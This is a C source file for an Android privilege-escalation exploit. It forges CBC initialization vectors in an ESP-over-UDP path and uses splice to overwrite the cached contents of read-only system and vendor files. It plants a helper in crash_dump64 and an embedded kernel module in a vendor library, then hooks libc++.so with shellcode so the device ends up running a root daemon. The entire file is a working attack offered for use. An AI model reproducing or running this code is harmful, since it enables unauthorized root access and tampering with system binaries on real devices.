#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "aes256.h"
#include "df_log.h"
#include "glk43284_state.h"

#define eos(s) (s + strlen(s))

static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";

/* IV = AES256_ECB_DEC(key, old_content) XOR desired
 * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
 *   = AES_DEC(key, old_content) XOR IV
 *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
 *   = desired
 */
static void compute_iv(Glk43284State *st, const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(st->aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

/* vfork + exec crash_dump64 (splicehelper); dup2 write_fd onto target_fd in child.
 * Pass mode="r" for read, NULL for write-splice.
 * Returns waitpid status, or -1 if clone fails (already logged).
 */
static int spawn_crash_dump(Glk43284State *st, off_t offset, int write_fd,
                            int target_fd, const char *mode)
{
    char offstr[24];
    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
    if (pid < 0) { DF_LOGI("vfork failed: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(1);
        if (mode)
            execl(kCrashDump, "crashdump64", offstr, st->ko_target, mode, NULL);
        else
            execl(kCrashDump, "crashdump64", offstr, st->ko_target, NULL);
        _exit(1);
    }
    int status = 0;
    TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
    return status;
}

/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
 */
static int read_vendor_content(Glk43284State *st, off_t offset, uint8_t buf[16]) {
    int rdpipe[2];
    if (pipe(rdpipe) < 0) { DF_LOGI("pipe failed: %s\n", strerror(errno)); return -1; }

    int status = spawn_crash_dump(st, offset, rdpipe[1], 0, "r");
    close(rdpipe[1]);
    int n = 0;
    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0)
        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
    close(rdpipe[0]);
    if (status < 0) return -1;
    if (n != 16) {
        if (WIFEXITED(status)) {
            static const char *const exit_meanings[] = {
                [0] = "success",
                [1] = "open vendor file failed or read returned < 16 bytes",
                [2] = "write to pipe returned < 16 bytes",
                [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
            };
            int ec = WEXITSTATUS(status);
            const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
            DF_LOGI("read_vendor at 0x%lx got %d bytes: %s\n",
                     (long)offset, n, meaning);
        } else if (WIFSIGNALED(status))
            DF_LOGI("read_vendor at 0x%lx got %d bytes: signal %d\n",
                     (long)offset, n, WTERMSIG(status));
        else
            DF_LOGI("read_vendor at 0x%lx got %d bytes: status 0x%x\n",
                     (long)offset, n, status);
        return -1;
    }
    return 0;
}

/* Send one CBC write.
 * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
 * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
 * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
 * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
 */
static int do_one_write_cbc(Glk43284State *st, int pipe_rd, int pipe_wr,
                            int sk_send, int file_fd, off_t offset,
                            const uint8_t iv[16], int use_helper) {
    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(st->spi);
    *(uint32_t *)(hdr + 4) = htonl(st->seq++);
    memcpy(hdr + 8, iv, 16);

    struct iovec iov = {.iov_base = hdr, .iov_len = 24};
    if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
        DF_LOGI("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
    }

    if (use_helper) {
        int status = spawn_crash_dump(st, offset, pipe_wr, 1, NULL);
        if (status < 0) return -1;
        if (!(WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
            DF_LOGI("splice helper failed status=0x%x\n", status);
            return -1;
        }
    } else {
        off_t off = offset;
        if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
            DF_LOGI("splice file failed: %s\n", strerror(errno)); return -1;
        }
    }

    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
    if (s != 40) { DF_LOGI("splice pipe->udp: %zd expected 40\n", s); return -1; }
    return 0;
}

/* Patch len bytes of payload into file starting at file offset foff.
 * Writes in 16-byte CBC blocks.
 * For system files (use_helper=0): reads old_content with pread().
 * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
 * len must be a multiple of 16.
 */
struct cbc_io {
    int sk_send;
    int file_fd;
    int pfd[2];
};

static void cbc_io_init(struct cbc_io *io) {
    io->sk_send = -1;
    io->file_fd = -1;
    io->pfd[0] = -1;
    io->pfd[1] = -1;
}

static int cbc_setup(Glk43284State *st, const char *path, int use_helper,
                     struct cbc_io *io) {
    io->sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (io->sk_send < 0) {
        DF_LOGI("socket failed: %s\n", strerror(errno));
        return -1;
    }
    int opt = 1;
    setsockopt(io->sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in src = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)st->sender_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (bind(io->sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
        DF_LOGI("bind port %d failed: %s\n", st->sender_port, strerror(errno));
    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)st->encap_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (connect(io->sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        DF_LOGI("connect failed: %s\n", strerror(errno));
        return -1;
    }

    if (!use_helper) {
        io->file_fd = open(path, O_RDONLY);
        if (io->file_fd < 0) {
            DF_LOGI("open %s failed: %s\n", path, strerror(errno));
            return -1;
        }
    }

    if (pipe(io->pfd) < 0) {
        DF_LOGI("pipe failed: %s\n", strerror(errno));
        return -1;
    }
    return 0;
}

static int cbc_block(Glk43284State *st, struct cbc_io *io, off_t off,
                     const char *payload, size_t index, int use_helper) {
    uint8_t old_content[16] = {0};
    if (use_helper) {
        if (read_vendor_content(st, off, old_content) < 0) return -1;
    } else {
        if (pread(io->file_fd, old_content, 16, off) != 16) {
            DF_LOGI("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
            return -1;
        }
    }

    uint8_t desired[16] = {0};
    memcpy(desired, payload + index * 16, 16);
    uint8_t iv[16];
    compute_iv(st, old_content, desired, iv);
    if (do_one_write_cbc(st, io->pfd[0], io->pfd[1], io->sk_send, io->file_fd,
                         off, iv, use_helper) < 0) {
        DF_LOGI("write #%zu at 0x%lx failed\n", index, (long)off);
        return -1;
    }
    return 0;
}

static void cbc_cleanup(struct cbc_io *io) {
    if (io->pfd[0] >= 0) { close(io->pfd[0]); io->pfd[0] = -1; }
    if (io->pfd[1] >= 0) { close(io->pfd[1]); io->pfd[1] = -1; }
    if (io->file_fd >= 0) { close(io->file_fd); io->file_fd = -1; }
    if (io->sk_send >= 0) { close(io->sk_send); io->sk_send = -1; }
}

static int patch_file_cbc(Glk43284State *st, const char *path,
                          const char *payload, size_t len, size_t foff,
                          int use_helper) {
    DF_LOGV("patch_file_cbc.begin path=%s len=%zu foff=0x%zx helper=%d", path, len, foff, use_helper);
    if (len % 16 != 0) {
        DF_LOGI("patch_file_cbc: len=%zu not multiple of 16\n", len);
        return -1;
    }

    struct cbc_io io;
    cbc_io_init(&io);
    int rc = 0;
    if (cbc_setup(st, path, use_helper, &io) != 0) {
        cbc_cleanup(&io);
        return -1;
    }

    for (size_t i = 0; i < len / 16; i++) {
        off_t off = (off_t)(foff + i * 16);
        if (cbc_block(st, &io, off, payload, i, use_helper) < 0) {
            rc = -1;
            break;
        }
    }

    cbc_cleanup(&io);
    if (rc == 0) {
        DF_LOGD("patch_file_cbc.done path=%s blocks=%zu", path, len / 16);
        DF_LOGI("patched %zu bytes to %s+0x%zx\n", len, path, foff);
    }
    return rc;
}

/* ---- KO and splicehelper blobs ---- */

extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern uint32_t libcxx_ko_target_off;

asm(
    ".section .rodata\n"
    ".global dfroot_ko_12_5_10_start\n.global dfroot_ko_12_5_10_end\n"
    "dfroot_ko_12_5_10_start:\n.incbin \"ko/dfroot-android12-5.10.ko\"\ndfroot_ko_12_5_10_end:\n"
    ".global dfroot_ko_13_5_10_start\n.global dfroot_ko_13_5_10_end\n"
    "dfroot_ko_13_5_10_start:\n.incbin \"ko/dfroot-android13-5.10.ko\"\ndfroot_ko_13_5_10_end:\n"
    ".global dfroot_ko_13_5_15_start\n.global dfroot_ko_13_5_15_end\n"
    "dfroot_ko_13_5_15_start:\n.incbin \"ko/dfroot-android13-5.15.ko\"\ndfroot_ko_13_5_15_end:\n"
    ".global dfroot_ko_14_5_15_start\n.global dfroot_ko_14_5_15_end\n"
    "dfroot_ko_14_5_15_start:\n.incbin \"ko/dfroot-android14-5.15.ko\"\ndfroot_ko_14_5_15_end:\n"
    ".global dfroot_ko_14_6_1_start\n.global dfroot_ko_14_6_1_end\n"
    "dfroot_ko_14_6_1_start:\n.incbin \"ko/dfroot-android14-6.1.ko\"\ndfroot_ko_14_6_1_end:\n"
    ".global dfroot_ko_15_6_6_start\n.global dfroot_ko_15_6_6_end\n"
    "dfroot_ko_15_6_6_start:\n.incbin \"ko/dfroot-android15-6.6.ko\"\ndfroot_ko_15_6_6_end:\n"
    ".global dfroot_ko_16_6_12_start\n.global dfroot_ko_16_6_12_end\n"
    "dfroot_ko_16_6_12_start:\n.incbin \"ko/dfroot-android16-6.12.ko\"\ndfroot_ko_16_6_12_end:\n"
    ".global dfroot_ko_17_6_18_start\n.global dfroot_ko_17_6_18_end\n"
    "dfroot_ko_17_6_18_start:\n.incbin \"ko/dfroot-android17-6.18.ko\"\ndfroot_ko_17_6_18_end:\n"
);

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
);

extern char dfroot_ko_12_5_10_start[], dfroot_ko_12_5_10_end[];
extern char dfroot_ko_13_5_10_start[], dfroot_ko_13_5_10_end[];
extern char dfroot_ko_13_5_15_start[], dfroot_ko_13_5_15_end[];
extern char dfroot_ko_14_5_15_start[], dfroot_ko_14_5_15_end[];
extern char dfroot_ko_14_6_1_start[],  dfroot_ko_14_6_1_end[];
extern char dfroot_ko_15_6_6_start[],  dfroot_ko_15_6_6_end[];
extern char dfroot_ko_16_6_12_start[], dfroot_ko_16_6_12_end[];
extern char dfroot_ko_17_6_18_start[], dfroot_ko_17_6_18_end[];
extern char splice_helper_start[], splice_helper_end[];

struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };

static const struct KoImage *select_ko_image(int andr, int major, int minor) {
    static const struct KoImage imgs[] = {
        {12, 5, 10, dfroot_ko_12_5_10_start, dfroot_ko_12_5_10_end},
        {13, 5, 10, dfroot_ko_13_5_10_start, dfroot_ko_13_5_10_end},
        {13, 5, 15, dfroot_ko_13_5_15_start, dfroot_ko_13_5_15_end},
        {14, 5, 15, dfroot_ko_14_5_15_start, dfroot_ko_14_5_15_end},
        {14, 6,  1, dfroot_ko_14_6_1_start,  dfroot_ko_14_6_1_end},
        {15, 6,  6, dfroot_ko_15_6_6_start,  dfroot_ko_15_6_6_end},
        {16, 6, 12, dfroot_ko_16_6_12_start, dfroot_ko_16_6_12_end},
        {17, 6, 18, dfroot_ko_17_6_18_start, dfroot_ko_17_6_18_end},
    };
    const struct KoImage *fb = NULL;
    for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
        if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
        if (imgs[i].android_release == andr) return &imgs[i];
        if (!fb) fb = &imgs[i];
    }
    return fb;
}

static int read_device_versions(int *andr, int *major, int *minor) {
    struct utsname u;
    if (uname(&u) != 0) return -1;
    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
    const char *m = strstr(u.release, "android");
    if (!m) {
        DF_LOGI("uname -r is missing Android version, trying getprop\n");

        char vendor_ver[5];
        char release[15];

        FILE *f = popen("getprop ro.vendor.build.version.release", "r");
        fgets(vendor_ver, sizeof(vendor_ver), f);
        pclose(f);

        sprintf(release, "android");
        sprintf(eos(release), "%s", vendor_ver);

        m = release;
    }
    *andr = atoi(m + 7);
    return (*andr > 0) ? 0 : -1;
}

/* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}

/* Write splicehelper into crash_dump64 page cache. */
static int patch_helper(Glk43284State *st) {
    DF_LOGV("patch_helper.begin");
    size_t len;
    char *buf = pad16(splice_helper_start,
                      (size_t)(splice_helper_end - splice_helper_start), &len);
    if (!buf) { DF_LOGI("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
    DF_LOGI("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
    int ret = patch_file_cbc(st, kCrashDump, buf, len, 0, 0);
    if (ret) { free(buf); DF_LOGI("patch: crash_dump64 patch failed: %d\n", ret); return ret; }

    uint8_t verify[16];
    int vfd = open(kCrashDump, O_RDONLY);
    if (vfd >= 0) {
        ssize_t n = pread(vfd, verify, 16, 16);
        close(vfd);
        if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
            DF_LOGI("patch: crash_dump64 verification failed\n");
            DF_LOGI("patch: DEVICE NOT VULNERABLE\n");
            free(buf);
            return -1;
        }
    }
    free(buf);
    DF_LOGD("patch_helper.done");
    return 0;
}

static int patch_ko(Glk43284State *st) {
    DF_LOGV("patch_ko.begin");
    int andr = 0, major = 0, minor = 0;
    if (read_device_versions(&andr, &major, &minor) != 0) {
        DF_LOGI("Can't parse kernel version - Non-GKI device? (unsupported)\n"); return 1;
    }
    const struct KoImage *ko = select_ko_image(andr, major, minor);
    if (!ko) {
        DF_LOGI("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
    }
    DF_LOGI("Using KMI: android%d-%d.%d\n",
             ko->android_release, ko->kver_major, ko->kver_minor);

    size_t len;
    char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
    if (!buf) { DF_LOGI("patch: %s - pad16 alloc failed\n", st->ko_target); return -1; }
    DF_LOGI("patch: %s <- dfroot.ko (%zu bytes)\n", st->ko_target, len);
    int ret = patch_file_cbc(st, st->ko_target, buf, len, 0, 1);
    free(buf);
    if (ret) DF_LOGW("LKM patch failed: %s", st->ko_target);
    else DF_LOGD("patch_ko.done target=%s", st->ko_target);
    return ret;
}

static void cleanup(Glk43284State *st) {
    DF_LOGV("cleanup.begin");
    if (st->restore.valid) {
        DF_LOGI("\n=== cleanup ===\n");
        DF_LOGI("restoring trampoline in %s\n", st->restore.lib);
        patch_file_cbc(st, st->restore.lib, (char *)st->restore.tramp_orig, 16,
                       (size_t)st->restore.tramp_aligned, 0);
        DF_LOGI("restoring shellcode in %s\n", st->restore.lib);
        patch_file_cbc(st, st->restore.lib, st->restore.shell_orig,
                       st->restore.shell_padded,
                       (size_t)st->restore.shell_off, 0);
    }
    free(st->payload);
    st->payload = NULL;
    st->payload_len = 0;
}

int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                     size_t shellcode_size);

struct hook_plan {
    char *buf;
    size_t padded;
    uint64_t hook_off;
    uint64_t shell_off;
    uint32_t first_insn;
    uint32_t hook_insn;
    uint64_t aligned;
};

enum hook_prepare { HOOK_OK, HOOK_ALREADY, HOOK_NOT_FOUND, HOOK_ERROR };

static enum hook_prepare hook_prepare(Glk43284State *st, const char *lib,
                                      const char *sym, char *stage_data,
                                      uint32_t stage_len, char *stage_start,
                                      char *first_inst_copy,
                                      Glk43284PatchRestore *restore,
                                      struct hook_plan *plan) {
    const uint32_t BRANCH = 0x14000000;
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);

    plan->buf = pad16(stage_data, stage_len, &plan->padded);
    if (!plan->buf) {
        DF_LOGI("patch: %s - pad16 alloc failed\n", lib);
        return HOOK_ERROR;
    }
    if (plan->padded > sizeof(restore->shell_orig)) {
        DF_LOGI("shellcode too large to save (%zu)\n", plan->padded);
        free(plan->buf);
        plan->buf = NULL;
        return HOOK_ERROR;
    }

    DF_LOGI("Finding symbol offsets for %s:\n", lib);
    if (find_hook_target(lib, sym, &plan->hook_off, &plan->shell_off,
                         &plan->first_insn, plan->padded)) {
        DF_LOGI("failed to find offsets for %s\n", lib);
        free(plan->buf);
        plan->buf = NULL;
        return HOOK_NOT_FOUND;
    }
    DF_LOGI("Found: hook=0x%lx shellcode=0x%lx len=%u\n",
            plan->hook_off, plan->shell_off, stage_len);

    plan->hook_insn = BRANCH |
        (((plan->shell_off + start_delta - plan->hook_off) >> 2) & 0x3ffffff);
    if (plan->first_insn == plan->hook_insn) {
        DF_LOGI("%s already patched\n", lib);
        free(plan->buf);
        plan->buf = NULL;
        return HOOK_ALREADY;
    }

    uint32_t jmpback = BRANCH |
        (((plan->hook_off + 4) - (plan->shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
    *(uint32_t *)&plan->buf[stage_len - 4] = jmpback;
    *(uint32_t *)&plan->buf[first_inst_copy - stage_data] = plan->first_insn;

    plan->aligned = plan->hook_off & ~(uint64_t)15;
    int fd = open(lib, O_RDONLY);
    if (fd < 0) {
        DF_LOGI("open %s failed: %s\n", lib, strerror(errno));
        free(plan->buf);
        plan->buf = NULL;
        return HOOK_ERROR;
    }
    int ok = pread(fd, restore->shell_orig, plan->padded,
                   (off_t)plan->shell_off) == (ssize_t)plan->padded
          && pread(fd, restore->tramp_orig, 16,
                   (off_t)plan->aligned) == 16;
    close(fd);
    if (!ok) {
        DF_LOGI("pread %s save failed\n", lib);
        free(plan->buf);
        plan->buf = NULL;
        return HOOK_ERROR;
    }

    restore->lib = lib;
    restore->shell_off = plan->shell_off;
    restore->shell_padded = (uint32_t)plan->padded;
    restore->tramp_aligned = plan->aligned;
    restore->valid = 1;
    return HOOK_OK;
}

static int hook_write_shell(Glk43284State *st, const char *lib,
                            struct hook_plan *plan) {
    DF_LOGI("patch: %s <- shellcode (%zu bytes)\n", lib, plan->padded);
    int ret = patch_file_cbc(st, lib, plan->buf, plan->padded, plan->shell_off, 0);
    free(plan->buf);
    plan->buf = NULL;
    if (ret) {
        DF_LOGI("patch: %s shellcode patch failed: %d\n", lib, ret);
        return ret;
    }
    return 0;
}

static int hook_write_trampoline(Glk43284State *st, const char *lib,
                                 const struct hook_plan *plan,
                                 const Glk43284PatchRestore *restore) {
    int pos = (int)(plan->hook_off & 15);
    uint8_t blk[16];
    memcpy(blk, restore->tramp_orig, 16);
    memcpy(&blk[pos], &plan->hook_insn, 4);
    DF_LOGI("patch: %s <- trampoline (16 bytes)\n", lib);
    int ret = patch_file_cbc(st, lib, (char *)blk, 16, (size_t)plan->aligned, 0);
    if (ret) DF_LOGW("trampoline patch failed: %s", lib);
    else DF_LOGD("patch_hook.done lib=%s hook=0x%lx shell=0x%lx",
                 lib, plan->hook_off, plan->shell_off);
    return ret;
}

static int patch_hook(Glk43284State *st, const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy, Glk43284PatchRestore *restore) {
    struct hook_plan plan;
    memset(&plan, 0, sizeof(plan));
    enum hook_prepare prep = hook_prepare(st, lib, sym, stage_data, stage_len,
                                          stage_start, first_inst_copy,
                                          restore, &plan);
    if (prep == HOOK_ALREADY) return 0;
    if (prep == HOOK_NOT_FOUND) return 1;
    if (prep == HOOK_ERROR) return -1;

    int ret = hook_write_shell(st, lib, &plan);
    if (ret) return ret;
    return hook_write_trampoline(st, lib, &plan, restore);
}

static int createOrphanProcess(void) {
    DF_LOGV("createOrphanProcess.begin");
    DF_LOGI("Triggering hook...\n");
    int pid = fork();
    if (pid < 0) { DF_LOGI("Failed to create orphan: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { sleep(1); _exit(0); }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    return 0;
}

int glk43284_state_init(Glk43284State *st, int encap_port, int sender_port,
                        uint32_t spi, const uint8_t aes_key[32]);
int glk43284_run_state(Glk43284State *st);
void glk43284_state_cleanup(Glk43284State *st);

static const char *detect_ko_target(void) {
    static const char *const candidates[] = {
        "/vendor/lib64/libbinderdebug.so",
        "/vendor/lib64/libstagefrighthw.so",
        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
    };
    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
        if (access(candidates[i], F_OK) == 0)
            return candidates[i];
    }
    return candidates[0];
}

static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
    if (strlen(hex) != len * 2) return -1;
    for (size_t i = 0; i < len; i++) {
        unsigned int b;
        if (sscanf(hex + i * 2, "%2x", &b) != 1) return -1;
        out[i] = (uint8_t)b;
    }
    return 0;
}

int glk43284_state_init(Glk43284State *st, int encap_port, int sender_port,
                        uint32_t spi, const uint8_t aes_key[32]) {
    if (!st || encap_port <= 0 || sender_port <= 0 || spi == 0 || !aes_key)
        return -1;
    memset(st, 0, sizeof(*st));
    st->encap_port = encap_port;
    st->sender_port = sender_port;
    st->spi = spi;
    st->seq = 1;
    memcpy(st->aes_key, aes_key, sizeof(st->aes_key));

    st->payload_len = libcxx_len;
    st->payload = malloc(st->payload_len);
    if (!st->payload) return -1;
    memcpy(st->payload, libcxx_data, st->payload_len);
    st->ko_target = (char *)st->payload + libcxx_ko_target_off;

    const char *ko_target = detect_ko_target();
    strncpy(st->ko_target, ko_target, 63);
    st->ko_target[63] = '\0';
    return 0;
}

static void usage(const char *argv0) {
    fprintf(stderr,
            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
}

static int setup(Glk43284State *st, int argc, char **argv) {
    int encap_port = 0, sender_port = 0;
    uint32_t spi = 0;
    uint8_t aes_key[32];
    int have_aes = 0;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (!strcmp(a, "--encap-port") && i + 1 < argc)
            encap_port = atoi(argv[++i]);
        else if (!strcmp(a, "--sender-port") && i + 1 < argc)
            sender_port = atoi(argv[++i]);
        else if (!strcmp(a, "--spi") && i + 1 < argc)
            spi = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (!strcmp(a, "--aes-key") && i + 1 < argc)
            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
        else { usage(argv[0]); return 2; }
    }
    if (!encap_port || !sender_port || !spi || !have_aes) {
        usage(argv[0]); return 2;
    }

    if (glk43284_state_init(st, encap_port, sender_port, spi, aes_key) != 0)
        return -1;

    DF_LOGI("=== setup ===\n");
    DF_LOGI("found ko_target: %s\n", st->ko_target);
    DF_LOGI("encap port: %d\n", encap_port);
    DF_LOGI("spi: 0x%x\n", spi);
    return 0;
}

static int exploit_patch_chain(Glk43284State *st) {
    if (patch_helper(st)) return 1;
    if (patch_ko(st)) return 1;
    if (patch_hook(st, "/system/lib64/libc++.so",
                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                   (char *)st->payload, (uint32_t)st->payload_len,
                   (char *)st->payload + (libcxx_start - libcxx_data),
                   (char *)st->payload + (libcxx_first_inst_copy - libcxx_data),
                   &st->restore)) return 1;
    return 0;
}

static int exploit_wait_markers(Glk43284State *st) {
    (void)st;
    static const struct {
        const char *path;
        const char *msg;
        int         rc;
    } markers[] = {
        { "/dev/df",    "libc++: loading custom module",                    -1 },
        { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
        { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 -1 },
        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    -1 },
        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
        { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
    };
    int seen[sizeof(markers) / sizeof(markers[0])] = {0};

    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
        usleep(10000);
        for (size_t j = 0; j < sizeof(markers) / sizeof(markers[0]); j++) {
            if (!seen[j] && access(markers[j].path, F_OK) == 0) {
                seen[j] = 1;
                DF_LOGI("%s\n", markers[j].msg);
                if (markers[j].rc >= 0) return markers[j].rc;
            }
        }
    }
    DF_LOGI("timeout: ERROR - check logcat & dmesg\n");
    return 2;
}

static int exploit(Glk43284State *st) {
    DF_LOGD("exploit.begin");
    DF_LOGI("\n=== exploit (patching files) ===\n");

    int rc = 3;
    if (exploit_patch_chain(st)) goto done;

    rc = 2;
    usleep(500000);

    DF_LOGI("\n=== init  ===\n");
    createOrphanProcess();
    rc = exploit_wait_markers(st);

done:
    if (rc == 3) DF_LOGI("patch: ERROR - failed to patch files\n");
    return rc;
}

int glk43284_run_state(Glk43284State *st) {
    return exploit(st);
}

void glk43284_state_cleanup(Glk43284State *st) {
    cleanup(st);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    Glk43284State st;
    memset(&st, 0, sizeof(st));
    if (setup(&st, argc, argv) != 0) return 2;
    int rc = exploit(&st);
    cleanup(&st);
    return rc;
}
